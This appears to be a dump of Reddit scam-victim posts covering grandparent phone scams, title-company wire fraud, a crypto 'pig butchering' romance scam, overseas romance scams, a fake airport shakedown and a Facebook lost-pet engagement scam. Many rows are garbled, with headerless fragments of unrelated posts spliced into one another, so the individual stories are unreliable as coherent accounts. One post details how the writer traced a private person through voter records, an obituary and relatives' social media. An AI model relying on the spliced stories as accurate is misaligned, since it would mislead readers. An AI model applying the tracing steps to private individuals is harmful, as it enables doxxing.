1683473340.0,At the Grocery Store: “Help a man is Harassing me!”,"My wife was grocery shopping at our local store with our two school-age children and a woman approached her begging her to “pretend to be my Mother and walk me out to my car in the parking lot. There is a man out there that is harassing me and I need your help.” Obviously this was alarming to both my wife and kids. My wife stated: “I’m sorry this is happening to you, but there is no way I’m going out there with you, especially since I have my kids with me.” The woman seemed disappointed and then huffed out of the store.
  This feels like a scam/kidnapping attempt to me, but wanted to see if anybody else had something like this happen to them.

Then she handed me more cards. Sigh. So I started getting nosey. She tells me that the president of her company asked her to buy them. I asked if this all happened over email. It sure did. This happened on her work email.

__________________

I really don't want to tell this story but if I had seen it before I may have done something different. This just went down yesterday.

We were buying a house this week, a rental property and were putting 25% down (around $100k). We had gotten a couple of emails from the title company about docs and stuff then I got one asking to put the closing cost in escrow. They sent wire transfer info and me not suspecting anything wrong followed through. I didn't know what the exact closing cost amount was and had to ask them and they actually had the right amount(?). They had sent us a Clear to Close email and all that so they knew we were closing this week and they knew who our real estate agent was (who was also fooled). The wire was to a Bank of America account (which I use myself) so I wasn't too worried. The next day alarms were going off from our mortgage company when we asked about it.

The person that did this convincingly impersonated the title company agent (the emails were almost identical to the earlier ones but of course they subtly switched the email address and changed the phone numbers in the signature section). I had no reason to suspect this was a different person and they somehow knew our closing cost which we are still trying to find out how. My wife takes care of the details and I just usually sign stuff and pay so I thought everything was legit.

I called BoA (2 hr hold) and they couldn't reverse it since it was the next day and said I had to sign some form before trying to recover the wire. I made a police report and reported it to the FTC/FBI but odds are the money's gone unless BoA can do some magic which I'm not expecting. 

One odd note, the people we were buying the house from only had one stipulation; that we use their title company. We didn't care because who cares what title company you use but we did think it was odd that they cared. 

I've been on this sub for a while and should have seen it coming but I didn't expect it could happen to me and definitely didn't expect this level of sophistication. They send you warnings about wire fraud but they don't warn you about how they do it. We'll be fine, just to accept I got...got.

ETA

Update:
The bank it was wired to was in Houston so we had someone go to the bank itself and get the bank manager on the phone (they weren't picking up our calls). They told us the account was already flagged because of the wire amount and the money from the wire was still in the account. They couldn't go into details but implied the account was frozen so the chances of us getting it back just went up but it may take a while because they need to do their DD and all. Looks like we caught it in time thankfully but of course there's no guarantees.

I observed for a minute as he was telling the person on the phone what type of gift cards we carried. After watching for a minute or so, I asked him who was on the phone, and he said “government”. I asked him to clarify, like was this the IRS, FBI, etc. He couldn’t give me a straight answer. So I firmly told him “hang up the phone”. 

He tried to argue with me for a second, but eventually I saw the light come on in his head. He told the person on the phone “you know, I’m gonna talk to my lawyer” and hung up. 

Afterwards he came up to the counter, and since my store was dead I explained how those scams work. He told me the caller was saying they have a warrant for his arrest for drug trafficking in Texas (we live in New Hampshire). He also told me they threatened to have him arrested, freeze his credit, and change his social security number. I advised him if he ever gets an alarming phone call and he’s scared it’s real, call the local non emergency number for the police. I even gave him our towns number for good measure.

She's gone.  The police were able to eventually find her in the hotel, checked in under a false name.  She convinced them she knew exactly what she is doing and is of sound mind.  They can't stop her, she's not doing anything illegal.

I found from her bank that they had also contacted the police last week as they were very concerned about her behaviour.  The police visited mum and she told them to fuck off and mind their own business.

I know she is a victim in this but I can't help but think how callous and calculated she's been in all this.  Keeping it all a secret.  Abandoning her children, her grandchildren, her great grandchildren, who all love her very much.  Does she truly believe in her actions?

We received a letter from her yesterday, posted before she left.  Apparently her flat has two week's rent paid and then the lease ends.  We have that time to sell/donate/take everything from the flat.  All our family photos are still there on the sideboard.

I don't know what's going to happen to her.  When she gets there, will there be anyone waiting for her?  If they want ransom, nobody in our family has the ability to pay.  If she decides to come home, we would struggle to find the money for that, let alone then finding her somewhere to live.

I'm sorry this isn't a happy ending.  I have cried a lot and will cry more.  This is worse than if she had just died, everyone goes through the death of their parents, but what she's putting us through, what she's been convinced is the right thing to put us through, is worse.

Her letter says she will stay in touch through Facebook messenger, and that she hopes we can forgive and support her.  I can only hope that we're wrong, only hope that everyone is wrong, and that she will find that wonderful new life she has been told awaits her.

1683643269.0,Dad scammed by phone call out of $9500,"I tried posting this previously but it wasn't allowed due to foul language - I have since calmed down a bit.  Lets try this again.

On Saturday my (44m) 75 year old father received a phone call from someone purporting to be his grandson, my sisters son, who is about to start college.  Lets call the grandson Jack.

""Jack"", said that he is in jail and has a broken nose and is bleeding and needs $9500 to pay a lawyer or he'll be there for 3 days.

He told my dad to go to the bank, take out cash, come back home, and a driver will pick it up.

He did that.  BUT my dad is old, and my brother lives with them.  MY BROTHER, an adult, an adjunct professor at an accredited university (albeit he is heavily on mental health medication and recreational cannabis), drove my dad to the bank, let him take out the cash, and let him give it to the scammer.  At no point did either of them call me or any other sane member of our family.

Anyway, my dad called the scammer back.  They sent a 'Lyft' driver.  However, the first driver apparently refused the pick up.  they sent another driver who accepted the envelope of cash and drove away.

THEN my dad called me and told me what happened and he realized he'd been scammed.  

I lost my mind.  I literally just worked with a government agency about informing consumers about scams.  I LITERALLY just told him what to do if this EXACT situation happened.  I told him someone would call him saying they were his grandson and they were in jail and needed money immediately.  Apparently he forgot.  

Anyway, I understand that they preyed on my dad and used his fear to reduce his faculties so he didn't question this.  But MY BROTHER?  I still haven't spoken to him about this because I'm so angry.  How could he let this happen?  

I have no hope we'll get the money back - yes the police are 'investigating', but I know they're just going through the motions so they keep their jobs.  I'm just so angry at the impact and trauma this has had on my dad, my family, and me.  It strained relationships that didn't need that.  

How am I supposed to come to terms with this though?

1685016847.0,Scammer convinced the bank teller they were me,"I'm still shocked that this even happened and especially disturbed that my bank basically assisted this identity thief. First time doing a long story like this, so here we go. Also on mobile so sorry for the formatting. 

Yesterday around 1pm I received a text message from my bank that my primary email address hadbeen updated and to call if I did not make this change. The text didn't provide a link to click but a phone number and reference number. Being the paranoid guy I am, I decided not to call the number but check my online banking app first, thinking the phone number might be fake or a scam of some kind. So I go ahead and open my online banking app to find that my email address had been changed, my home address had been changed, and a work phone number that I had left blank on purpose had also been added. I did not think to take a screenshot of the information that was changed at the time or write it down for my own records. A little panicked, I used the banking app to change the above personal information to the correct personal information. I then changed my password for my banking app. I made sure that I did not misplace or lose any debit or credit cards, all are accounted for. I check all my bank accounts, credit card statements and everything is good, no money lost or unaccountable spending. No new loans or credit card applications. I feel safe and satisfied and like I've solved the problem. I let my fiancee know of the weird situation that just occurred. She's typically more cautious about stuff than I am and tends to worry more between the two of us. She urges me to call the bank anyway just to be on the safe side. I am so thankful I listened to her. 

So I fire up the banking app again and called my bank's fraud support. After a lengthy discussion, Iwas informed that sometime on the previous day, someone had visited a physical bank location in my city and made personal information changes with the help of the employees. I was shocked. I asked the fraud support member how that would be possible if I didn't lose any of my bank cards? They informed me it looked like they used personal ID to change the information. I quickly check my wallet and verify that I still have my driver's license and all other forms of personal ID. The fraud support member then directed me to head over to a physical bank location in order to secure my account and personal information. 

I arrived at the bank and was quickly assisted and was given more details about my compromised information. A bank branch employee told me that someone had visited a different branch of my bank in my city, one I have never personally visited the day before yesterday. I confirmed that I had not visited the bank at that time or location as I would have been sleeping and preparing for my night shift. The individual had then used a drivers license from a different province (I'm Canadian) and personal Military identification with my name, information, and likeness in order to change my personal information including email, home mailing address, and phone number. The staff members confirmed that the only way this information could have been changed was if an individual walked into the bank with ID and convinced the bank teller they were me. 

I confirmed with the bank staff that I have never had a valid driver's license from another province but had previous service in the military, however was no longer serving. The bank teller then provided the military service number that was used by the scammer and it didn't at all match my military service number. It was also confirmed that  at this time there had been no money lost, credit card applications etc. attempted. I made sure to let my bank know that I would like my account flagged and identification checked every time I visit a branch in person, and my only forms of identification that should be deemed accepted. They agreed it would be for the best. The said they would be making phone calls to the branch that allowed my information to be changed to sort out how this could even happen. I was then advised by the bank staff member to make a police report which I absolutely did.

I plan on returning to the bank later today to follow up. I'm also going to inquire about monitoring my credit score. I feel like if someone went to all the trouble of making two ID's they might try to get a car loan or a phone plan in my name and not ever pay the bills. Meanwhile the bill might be sent to this made up address somewhere else as used on the false ID's. I also seriously hope that they discipline or even fire the employee who helped this scammer do all of this in person. Anyways thanks for reading Reddit, you're the best.

1677400066.0,Got caught in a pig butchering scam. Sharing my story to help others.,"Im a 28 year old female from Australia. I decided to go dating online using Bumble after my breakup with my ex 7 months ago. I believed I was healed and excited to find someone, I knew what I wanted in my next relationship. The first day I was on there, I matched with a good looking Malaysian-Chinese man.

We chatted for an hour on the app and moved on quickly to use Whatsapp. He apparently fell in love with me after 3 days of chatting with me, and proceeded to love bomb me, promised me the world, wanted to make me his woman, give me everything he owns when we get married. Initially this was too much for me and I confronted him about it. He said he understands but its how he shows his love. He respected my boundaries, gave me a lot of compliments, promised me a bright future, encouraged my ideas and plans etc. I liked talking to him every night, this was all over text. We called once or twice but he was usually too 'shy' or 'nervous' to speak to me on the phone and meet up. I was also a shy and anxious person so I understood.

We then started to speak about his tough childhood growing up and his journey into investing. I was into property investing and understood basics of stocks and crypto. He told me about how he makes money by placing most of his savings in a mining pool, which generates roughly $7K a day. He has been doing it for an entire year. He showed the screenshots as proof, and the amount he had in his savings. I believed it and so when he asked about my finances, I told him about it without thinking too much since he was also open about all of his finances. He convinced me to put my savings in a mining pool so we can both we financially free together so I did that. Initially it was $8K usd.

Over the next week, I was able to see returns of about $400 a day. He mentioned that these mining pools are great, but they don't last long. This particular pool will end in 2 months. This baited me to put in most of my savings. I liquidated my stock and crypto assets, and stupidly added it to the wallet, totalling $60K usd.

Then the mining pool sent out a notification to join this 'Couple activity' and pledge your funds to the pool for greater returns. The guy I was talking to mentioned how we have enough funds to join this activity since the requirement was wallets totalling $300K usd. Once we joined, he panicked and realised that to complete this activity, and release the funds, each account needed to have $150K usd. We didn't understand the requirements fully. I just jumped into it without thinking. He then reassured me thats its fine and its possible to get this money. We just need a plan.

He told me he was short on money and was unable to help me at the moment, but he’s trying his best to do everything he can to make this problem go away quickly so we can finally have our first date. His friends won't be able to assist. He has a bad record with the bank so he can't get a loan. Trying to convince me that he's exhausted all his options and no one can help him. He's so tired from working 12 hour days, telling me that his only motivation  to work is because of me. I brighten up his day etc. Don't think too much about the problem, let's be optimistic he would always say.

I was reassured by the customer support team and him, that this was all we needed to do to get our funds back. He said he has done it multiple times before but only participated individually, however the rules have now changed.

My stupid ass decided to add in all of my savings to this pool,  apply for a personal loan and borrow money from my parents to make up this total, because there was no other option else I'd lose it in a couple of days. I made it happen, completed this activity, but was told that I needed 30% of the $150K in my wallet to 'open the release fund channel' to withdraw these funds. After hearing this and confronting him about it, he said he had forgotten this was a requirement when he participated before but promised that this was all we need to do to get our money back.

By then, I realised this was all a scam and started to find similar scams to this. I've also checked the wallet address he apparently pledged with me, and realised that no such funds were taken out like they did with mine. I lied to him that I had the money to withdraw the funds, but he had to prove to me that I was going to get this money back. He instantly flipped, turned on me, gaslighted me about how I don't trust him after everything we've been through.

I never thought I'd be one to fall for one this badly, and lose so much. I work in IT and am usually so careful when it comes to these things. I went through feelings of self-blame, shame, guilt, depression and embarrassment. I was stressing out so much over my job before and thought about leaving but now I have no choice but to work to keep up with my mortgage repayments. This situation messed me up really badly, and also caused me to have a lot of trust issues and not ever want to date again. There were so many red flags I missed but now see clearly. I was also isolated to not talk about this situation with my friends and parents because 'they wouldn't understand it' and 'we can fix this problem ourselves' so I shouldn't worry them with our matters.

I've seen a psychologist about this and spoke openly with my parents and friends about it to start the healing journey, but I'm still fairly shocked that it happened over a short amount of time. I save every dollar and don't spoil myself at all, so this loss was painful. As a result of this, my parents are now having to revise their finances to retire comfortably. I understand that I was a victim of this and that these scammers use strong psychological tactics to bait you into getting scammed but my guilt is eating me up every time I see them stress out about their finances.

I've reported this to the police but I've accepted that this money is lost forever and I won't be able to get it back. I'm hoping that sharing my story can stop others from making the same mistake.

EDIT: Thank you everyone for your supportive comments. They're greatly appreciated and they do bring me a lot comfort to what has happened. 

With regards to the comments on how stupid it was of me to fall for this. I can understand that. I believe a part of the reason was due to my first time ever online dating, and recently getting out of a very long-term relationship with a lot of wounds and a low self-esteem. I've definitely learned a hard lesson after this experience, and will definitely work to strengthen other parts of my life first before ever looking for a relationship again.",Scams,6635,1258,149,1

1681760337.0,Mexican Airport Vape Scam,"Wanted to warn people of a scam I just encountered at the Cancun airport when leaving back to the states. I was hitting my vape outside the airport before tossing it into the trash (my first mistake). A man in a button up and headset came up to me and asked to see my vape. He said “this is CBD” and is illegal. Took my vape and said there are two options. First option is to go to the doctor at the airport and take a THC test and he said if it’s positive, I’ll go to Mexican jail. Other option is to pay 9000 pesos ($450 USD). This just so happens to be the max amount you can withdraw from the ATMs at the airport. I tried to stall and talk my way out but he basically threatened me so I decided that 450 bucks wasn’t worth the potential headache/trouble. This man identified himself as security but it’s pretty obvious it was a scam but i didn’t want to fuck around and find out so I paid. He was wearing a button up and pants with a ear piece. It seems there were multiple men involved since he called over to his friend with the ear piece. So learn from my mistake, don’t vape outside the airport.",Scams,1103,218,15,1
1641217774.0,"Without warning, MIL took off to Kenya to marry the scammer","MIL sent text Xmas day that she's going to Kenya. She's there now with this man ( half her age) who she wants to marry. Won't go into all the details of his hospital stories but quick summary - he needed $250 a day injections for covid recovery, daughter almost died - needed two operations, he had kidney operation, almost died again from heart attack. Just goes on and on. So many lies about the hospitals too as I tried to tell her the hospital name didn't exist but she wouldn't listen to anything.

Anyway, so she is in Kenya now. She has just left swish hotel to go to a house. Who's house? I don't know. Today she sends pictures that she finally met his daughter. Apparently the daughter has been living at his sister's house but came to meet her today. Also, in an incredible twist of fate, the mother of his daughter, who abandoned her at birth, now wants her back and is taking her back to the USA where she lives and works as a Dr. Seriously, this story is so twisted..

Anyway, next steps are for her to marry him which she really wants as she gave him the ring herself  and then she wants to invest in greenhouses. Literally, she's prepared to give all her life savings on this - once he marries her. She also says she wants to live and die in Kenya with him. Nevermind her grandkids or family at home. 

Anyway, I'm wondering what we can expect. I don't think we can stop her but can we do anything? I'm assuming she will be swindled big time.  I noticed the man always has his sister not too far away...do you think this could be his wife or girlfriend? She's got to be an accomplice as she goes along with the stories. Its all really messed up but we feel helpless and have tried everything. Now I guess we just watch her fall? Could there be any hope in this situation?

Update: Thanks for all your advice. We have had some contact. She is renting an apartment in Kisumu but won't provide the address. She says there are no addresses there . The man she is involved with has now found a job and works 7pm to 7 am. Meanwhile, he hasn't taken her to his home though claims the sister Lucy has a nine bedroom mansion. Yesterday was her first day out òf the apartment as she relies on him entirely. They plan to marry and now she is planning to invest in greenhouses. She wants to buy 6 x $10,000 USD as he promised her they would make $120,000 USD profit à year. I said to her to send me the company profile as I'd like to invest too for profits like that and not having to work. Since then, he got in touch via messenger and asked the fam to 'stop the drama' and what we wanted for him to leave her. I think he was trying to get us to offer money. Its very bizarre.

1685155658.0,95% this was a scam at a gas station interaction today.,"So I pulled up to Loves gas station along the freeway today. 

A man comes up to my dad and says his card was charged for his gas and our gas since we pulled up at the pump after him (supposedly). He shows me an bank account charge for the exact change of how much I pulled from the pump. 

However I remember putting in my card and the machine and it was not in the middle of a transaction when I arrived. The hose was in its holster and the machine approved my card. 

The guy wanted us the go into the gas station and reverse the charge. I understand it doesn’t work like that and I say no. I am guessing he will ask for the money in cash or something. I refuse and tell him I don’t know him and I put in my card and I am confident it charged my card.  

Here’s the kicker. I was not charged by the gas station right away. I almost thought he was telling the truth until I realized some transaction of mine charge me at a later point. For example sometimes I see I get charged hours or even a day later. 

He threatened to call the police and took photos of my car to intimidate me. This was all for $16 I put into my car. I refused and said please call them and then I left. He walked away pretty quick before that.

I was taking my kid by to the room. A women approached me on the motel property and asked if she could use my bathroom. I said no go to the front desk area, there is a bathroom there you can use. She was like no I need to use yours its more private. I said no sorry I don't let strangers into my room and my wife wouldn't be too happy with that. I walked away but she kept following me up the stairs. Then I turned just went to the elevator on the next floor and took it back all the way down. She didn't enter., I walked to my wife and told her to wait for a bit. After 15 mins, I took the elevator back up to my floor didn't see her and hurried into the room.

1679570504.0,Should we steal mums passport?,"Just hear me out...

I posted elsewhere but got zero answers so I searched for scams and found this sub so I'm asking here. I copied and pasted this from my other post but will add some more details at the bottom. This is a throwaway account because this situation is bonkers and easily identifiable.

A few weeks ago my mum (63) broke the news she has a Nigerian fiance. She had known him for 3 weeks at that point. She broke the news by showing the family a photo of him and saying 'This is my fiance, the only problem is, he's in Nigeria' (we live in the UK). They met on a language app and he is 36. Apparently he is dirt poor, so poor he has to live with his boss. But he has a smartphone and apparently a pretty decent data package judging by how much they facetime all over the place (like if he's on the bus or walking somewhere). 

My mum has very poor mobility, she struggles to walk, she can't walk without sticks and she can't do stairs very well either. She is very overweight and has a whole host of issues relating to this such as arthritis and fibromyalgia. 

She has booked a flight to Nigeria for next month, and this guy-remember, he is dirt poor-is suddenly getting an apartment, planning on renting a car for when mum is out there, and they're going to stay in a hotel because his apartment will have stairs.

The family is really very worried about her, she confessed to me that they were planning on getting married when she goes over there. Hopefully I put her off that by telling her that her mum would probably disinherit her if she does. My mum does not have money, I think she's used most of the last of her savings to book this flight. So it's not losing her money that we're all worried about, it's just that this is all ridiculously fast and while I know there is a slight chance this is genuine, I just can't believe that it is. We believe he's just using her to get citizenship to the UK or possibly something more sinister...

Last night my grandma rang me and asked if I knew where mum keeps her passport, she and my sister have been talking and they've decided we need to steal it a few days before she's due to fly so she has no time to get a replacement. My grandma has spoken to a friend of hers who has a Nigerian friend, and even the Nigerian friend has said this is without a doubt a scam, if my mum flies out there she will likely be held hostage and we will be asked to buy her back. 

My sister asked mum ""What do we do if you're kidnapped and we're asked for money?"" Mums response was ""He said that wouldn't happen, he'd stay with me at all times."" I don't think she realised my sister meant 'What if HE kidnaps her'.

1601756336.0,19F got scammed by a 33M Army vet. Then I tracked him down to get what is mine.,"Well Reddit, 

This will be my second post. Only a mere 12 hours later. Apologies for the dramatic title, I feel just a tad proud. This is a follow up to my original post https://www.reddit.com/r/personalfinance/comments/j4cqb2/am_i_being_scammed_or_am_i_just_paranoid/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf i put up on a different subreddit. 

Edit: OG post got deleted. I’ll give a tl;dr here of my original post. Basically I got swayed by a really good price for a Macbook on fb marketplace. Seller had a pretty established FB profile but with very restricted view. No friend list, several photos (most were stock photos), some info about his job (useless in the end), his school district and alma mater. We compromised by having me pay half upfront, half when I received it. I got tricked into thinking this was a good idea. Well, guess it wasn’t.  Sent my half, seller ran. 

When I realized I had been scammed, I felt like throwing up. I felt more stupid than I ever had in my life. I couldn’t even tell my boyfriend what happened because of how embarrassing and ridiculous all of it was. My boyfriend kept telling me to take this as a lesson and let it go. But how could I? So I did not. I put on my thinking cap and begun digging. At this point, he had deleted his facebook profile, the one lead I had. I realized his convincing facebook was mostly faked. Most photos were stock photos (and maybe a profile photo which was a group photo, he was in it) and information like his job was practically useless. He also had faked his address, name, phone number, etc. His iMessage was linked to an email and not phone number. That email is also a dead email. I will expand on this later. And my dumbass took ZERO screenshots of anything at all. Fortunately, I have pretty much memorized every little detail on his profile. 

I had stated in my previous post that I had managed to find what I assumed was his real name just minutes before he dipped. So that became my first tip. I plugged everything to google. My first score was googling one of his stage names (he had two) and found a really blurry photo of him from soundcloud, good enough. Google image search did not help. Next, I googled his REAL name next to his stage name (he is now some type of soundcloud/no name DJ/music producer). I found a contract between him and an old manager that had been posted online. His address was listed on it. And what do you know! It was the SAME STREET (different house number) as the address he put up on the fake shipping label he sent me (btw the address on the shipping label is a vacant, for sale house I found out). Bingo. Then I googled the address to reverse check it. Multiple websites, most notably, his state’s database (based on voter registration) pulled up the current occupants of the home, including his name. I’m convinced this can’t possibly be a coincidence. But I had to have more evidence. I googled every single occupant of the house and one turned out to have died back in 2009 (Lets call them A). I found A’s obituary. In it, was everyone’s name. Then I googled A next to state. Again, it verified that A’s name was listed as the owner of the scammer’s exact home address. Found out later A is scammer’s grandmother. 

The tricky part is realizing that scammer and dad had the exact same name. One is a senior, the other junior but I found this out way later. When I googled scammer’s name, I also kept getting dad’s information. So I always end up second guessing myself. My jackpot was plugging the full name including middle name which I did not know before, obtained through obituary, onto facebook. Pulled up dad’s profile. Dad’s facebook is quite active. I almost thought I had gotten the wrong guy all along because obviously, dad looked very old and it just was not the right guy based on the soundcloud photo. But, my gut said to look further so I scrolled and scrolled and scrolled and found gold. A happy birthday post to his son the scammer. He uploaded a bunch of pictures of scammer, INCLUDING the exact same one I had found on soundcloud earlier. I have never felt more relieved. All of my research was not in vain. Now that I have compiled enough information, its go time. I thought about emailing the email tied to his iMessage but I figured this was useless. He had faked everything else, this email must have been just as useless if he so willingly showed it. So I went back to the contract I found earlier and found his REAL email address. Thought emailing him there would make this even better. 

This is what I wrote to him: https://imgur.com/a/DCLXbxt

I also hit up dad and explained to him everything. Dad was a real cool guy. Dad apologized and sought to make it right. 

Well.... an hour later: https://imgur.com/a/cUkHp9N
and finally: https://imgur.com/a/mJSQ0TG

Well there ya go. I’m sorry if this was anti climactic. I had fun though and all is well in the end. :)

Edit: To avoid confusion, the real amount is indeed $650. I know in my original post I said $700, but this was just rounding up.

Edit 2: Hey guys! I just thought about including this. I guess I never really explained the US Army bit, I included that in the title for shits and giggles tbh, this wasn’t a huge point to the story or anything but! i thought this would be a fun bit. He bragged about being in the Army while I was still chatting with him the night I paid him. See how he kept telling me to pay up? This gave me some sense of comfort that he wasn’t messing around. But alas, he was. Here’s the chat: https://imgur.com/a/cSpjAj6
In the end, this bit helped me a little. Remember I said I found dad’s happy birthday post? Well one of the photo was also him in uniform which just convinced me further I got the right guy, next to the soundcloud photo of course! :)

Edit 3: HOW I GOT HIS NAME! Ahhhhh! Can’t believe I forgot to mention this!!!! So its actually pretty easy. The fake name he used was really really generic. Any google search of that name would give you 8273837392 results so it dawned on me that it might just be...fake. I don’t know why I had the feeling. Well, I found this out before I even found out I had been scammed (look at my first reddit post linked above). This is how I found out: I was scrolling through his entire profile, and clicked on every single photos he had posted that would pop up in his TL. most photos were like photos of captain america, flags, things like that. i clicked on EVERY SINGLE LIKE, and EVERY SINGLE COMMENT to get SOMETHING. Well one of the photos, it was a flag. I’m going to try to explain it so it make sense, so when someone comments under a photo and then the poster (in this case, scammer) respond, they will tag the commenter right? and then if its a conversation, they keep tagging each other so like “John Smith Nice flag!”
“Jane Doe thanks!” 
“John Smith no prob” 
Like that. and the tag was HIS REAL NAME different from the one listed on facebook. 
Also he had an OLD birthday facebook fundraiser thing and the title was “Real Name’s Birthday Fundraiser”

Many summers ago these two kids knocked on my door. They had a bucket, some sponges and car shampoo with them. The older one (about 12), explained they were raising money so they could go on a school trip to America by washing cars. The car in my driveway wasn't mine, but my housrmates, so I called him down to ask. We agreed to split the £5 it would cost between us, not because the car needed cleaning, but because we'd done similar odd-jobs around the neighborhood when we were their age, and it was only £5. So we gave him the money.

The older boy asked if we could fill the bucket from the tap. We went to the kitchen sink in the back of the house and returned to find only the older boy there - the younger one had disappeared.

The boy explained that his friend had started crying and ran off (in the minute it took to fill tr bucket), and that he should go after him - ""Ill be right back"" he promised as he jetted off up the street.

As we closed the the door, my housemate and I turned to each other and said ""No he won't"" with a wry chuckle.

1681998661.0,I think a man I was dating in real life tried to scam me - does this sound like a conman?,"I met this man 2.5 months ago on the league (dating app). He said he had a high profile career in asset management, and while I was able to see a tiny bit of a digital footprint, it was very limited. 

For the first month everything seemed fine and normal, but I started to doubt his sincerity in the middle of March. At the beginning of April, he told me that due to a deal he was brokering between government entities in China and Sultan Al-Maadeed of Qatar, the Chinese government had accessed 3rd party data on his cellphone, determined that he and I had been spending a lot of time together through that data, and somehow was able to run a “check” on me. They apparently needed to make sure that I had no connections to government or business officials in the United States that would interfere with the success of this “deal”. He warned me that I might be receiving phone calls from Shanghai or Beijing and to not answer. 

When I pressed him on this later, because it made no sense to me, he changed his story to last year his ex girlfriend tried to expand her business to China, but it failed and due to that the Chinese officials contacted him to ask about her directly, and he just told them he wasn’t with her anymore and was with me instead and then gave them my info and they ran a check on me. I started to feel like I was being setup here, like china was going to be this big, scary entity that he could possibly use to justify like, weird requests or something. 

Anyhow I pretty much told him “look if this is some tinder swindler bullshit I have nothing” and while it caused some strife for a few days that died down. However last week, after one of my kids had a medical crisis and he wasn’t particularly helpful, I dumped him and then blocked him because I needed the space. He started emailing me and in one of the emails he offered to send me $15k to help with medical expenses, he just needed my bank account info. (His exact words were 'I can transfer or provide account info, your call.')

I immediately said no, because I didn’t feel like it would be appropriate to accept his money, but after awhile I started to feel really uneasy about the idea that he’d ask for my bank info and not just Venmo or something?

In the 2.5 months we dated, I only ever met him at hotels, from our very first date either family members were staying at his place, it was messy, or then it was unfurnished cause all his stuff was in storage, and then he broke his lease early because he didn’t like the building. He claimed to own a house in another town, but had friends renting it out. I never met his friends, family, co-workers, and he was very terrified of me being added to his social media, though he happily met my friends and was going to go to a wedding with me this weekend until I dumped him last week.

1681358233.0,Facebook “Found Lost Dog” or “Lost Child” post scam.,"Current scam being posted in local/neighborhood/city Facebook groups. Its a post saying someone found a lost dog/cat/pet or even a child in some cases. Post will ALWAYS have comments off (which is odd because if you truly wanted to connect with the owner/parent you would leave comments on so they can contact you). 

Post will be meant to be extreme (injured, gory in this case, cold/hungry, turned into pound/police, etc.). No specific details about location found- just road or off highway. 

Scam purpose? Get lots of share and engagement on the post and then change it, and sell the account after a while. A lot of these come from hacked or cloned accounts as well so they look legit. Accounts with good engagement are worth $-$$. The post will be changed after a while into a rental listing scam, a scam sale item, or phishing link. The scammer does this to get more eyes on their scam as well as build “legitimacy” since people’s friends are sharing it. Scammers also hope people will message the account trying to “help out” with money or other offers.

1676677062.0,Someone is scamming guys on whatsapp and giving out my address as their “home”,"The last couple of Friday nights strange men in their 60s have shown up at my door asking for “Sarah.” It looks clear they think they’re expecting to show up for sex with a young girl. And then they get me in full goblin mode opening the door in my pajamas. The guy who just showed up drove FOUR HOURS from the next state over and mentioned something about having sent gift cards. 

Is there anything I can or should do about this? I’m assuming the police can’t do anything, but should I try to file a report anyways? I’m afraid I’m gonna get murdered by one of these weirdos who’ve been scammed.

They said basically they can’t do anything, and the only person that can officially file a police report is the scam victim, but to keep calling and reporting it every time it happens so that they’ll have notes on my address that something is going on.

1687659598.0,"Scammed for entire life/retirement savings, looking for advice","Hi, first time posting but in need of some help! Any input is greatly appreciated.

Never thought that this would happen to someone so close to me, but I just received a frantic call from my mom this morning that my dad lost their entire life/retirement savings. 

My dad (already past retirement age and retired) had received a message from a close friend in a social media platform for an investment opportunity in cryptocurrency, promising high returns. The website starts with ppl letters Led***. This was a trusted friend so he clicked on the link (not sure if the friend was hacked or was created under a false account). I don't know the details of what happened after that but supposedly they convinced my dad to put all of his savings account money into this crypto scheme in $50k increments. They sent him ""proof"" that his money was growing, at a 300% rate or something, and convinced him to put more money in. That's when he ""borrowed"" money from his 401k, withdrawing hundreds of thousands, again in $50k increments until his 401k investment bank flagged it as suspicious and refused to allow him to withdraw his remaining $10k that's left in there. That's when my dad realized that he had been scammed and proceeded to close all of his bank accounts (not that there's anything left).

The Led*** company then realized he had stopped putting more money in and proceeded to threaten to sue him and take his house away. 

The 401k company is also now demanding that he pay up within 2 months for the money that he had borrowed from the 401k or suffer additional fines at a high interest rate. 

My dad's beside himself as he has no money to be able to pay it all back as he's retired and is now saying he wants to commit suicide. This his and my mom's entire life and retirement savings that they've been saving for the past 50 years. 

I don't know what to do. Have there been any stories of people being able to recoup these losses back? Can 401k companies demand that you pay back the borrowed money within 2 months? Isn't your 401k money yours to withdraw after age 59.5? Is the 401k company scamming him, too??

Appreciate all the feedback in advance. Thank you!!

Edit:

Thank you all so, so, so much for all the feedback and kind words. I wanted to provide an update after calling my dad this evening. I preface this to say that my dad never gives me the full info, only in bits and pieces that I feel like I have to squeeze out. 

Turns out, it wasn't his 401k. He had consolidated all of his 401k accounts into an IRA account and borrowed against that. That is why they are demanding that he return a portion of the money (he's taking part of the distribution as a hit and as part of his income for the year). If he chooses to take the entirety of it as part of his income, he would not be able to afford the amount of tax that would be due on it.

So I guess that solves that mystery and there is no way out of it. Now I have to figure out if I should take out part of my 401k to help him pay back his IRA...

Also, we have already filed police reports and FTC fraud report. Will get on the FBI report tomorrow. 

Thank you all again. <3",Scams,3156,590,70,1

They explained they just received a call from a girl who was crying and she sounded just like me. She called them Grandma and Grandpa, and she explained that her friend Amanda died in a car accident yesterday, so she and a friend flew to Miami for the funeral. She booked an Uber, she and her friend put their suitcases in the trunk, and they left the airport. Then they were pulled over by the cops, who searched the trunk and going 2lbs of marijuana. The driver said ""it's not mine, everything in the trunk is theirs"". Which is how the scammer pretending to be me ended up in jail in Miami, and she needs $13,750.00 in cash delivered to a local bail bondsman so that he can send it to her lawyer so that they can pay an ""appearance fee"" in front of a judge, otherwise the scammer will spend the next 6-8 weeks in jail waiting for a hearing. 

They said the girl who was pretending to be me transferred the call to her lawyer, who explained the breakdown of the fees and how a local bail bondsman can facilitate the transaction. My grandparents own a couple of businesses, so they asked the lawyer to fax them a copy of my arrest report, and his contract, and at that point he explained how urgent the matter was, etc etc and ultimately hung up.

Yesterday she went to an urgent care center she's been to several times before, and the receptionist was being extremely sketchy - telling my mom she thought her medicaid card was fake (its not) and to give her her SSN. My mom refused because she knows that's not something you have to give.

After a bit of back and forth my mom goes to the waiting room when she gets a phone call from someone who says they have questions about how she is using medicaid. My mom says they never call you, they send letters, so she demands to know who is calling and why. Guy on phone hangs up.

I posted before about how someone saw my story trending, stole the post and moved it to another social media platform and received over $400 in donations towards my daughters bucket list (or what the donors thought it was going to). I shared and reported and every post got removed for saying the name of the account.

